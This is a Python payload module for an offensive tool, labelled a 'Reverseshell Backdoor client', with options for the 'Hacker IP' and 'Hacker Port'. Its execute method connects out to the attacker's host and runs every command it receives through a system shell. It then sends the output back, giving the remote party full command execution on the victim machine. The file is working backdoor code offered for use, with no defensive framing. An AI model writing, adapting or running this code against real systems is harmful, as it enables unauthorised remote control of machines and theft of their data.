MODULE_TYPE = "payload"
import time,socket,subprocess
from collections import OrderedDict
# Module class definition
class ModuleClass:
    def __init__(self):
        self.info = {
            'Name': 'Reverseshell Backdoor client ',
            'Rank':'Good',
            'Platform':'Windows/Linux/Macos',
            'Description': 'Connects to listener reverse shell on HackerMachine, it should be stagged i.e using tcp/http stager',
            'Author': 'pyLord@cyb3rH4ck3r',
            'Date Release': 'Tue/4/March/2025',
            'Options': OrderedDict([
                ('RHOST', ('', True, 'Hacker IP')),
                ('RPORT', ('', True, 'Hacker Port')),
                ])
                }

    def help(self):
        print("Usage: set RHOST <IP> | set RPORT <PORT> <type> then run")
    	
    
    def execute(self):
        host = self.info['Options']['RHOST'][0]
        port = self.info['Options']['RPORT'][0]
        with socket.socket() as sock:
        	addr = host, int(port)
        	sock.connect(addr)
        	while True:
        	       try:
        	       	d = sock.recv(1024).decode()
        	       	output = subprocess.check_output(d, shell=True, universal_newlines=True)
        	       	sock.sendall(str.encode(output))
        	       except Exception as e:
        	       	sock.sendall(str.encode(str(e)))
        	
        
        return sock.sendall("[OK]".encode())
    